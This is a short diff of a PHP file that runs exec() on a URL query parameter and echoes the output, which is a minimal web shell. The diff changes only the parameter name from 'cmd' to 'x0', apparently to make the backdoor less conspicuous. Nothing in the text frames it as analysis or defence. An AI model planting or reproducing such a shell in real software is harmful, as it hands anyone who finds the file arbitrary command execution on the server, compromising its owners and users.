@@ -1,3 +1,3 @@
 <?php
-echo '<pre>'. exec($_GET['cmd']) .'</pre>';
+echo '<pre>'. exec($_GET['x0']) .'</pre>';
 ?>
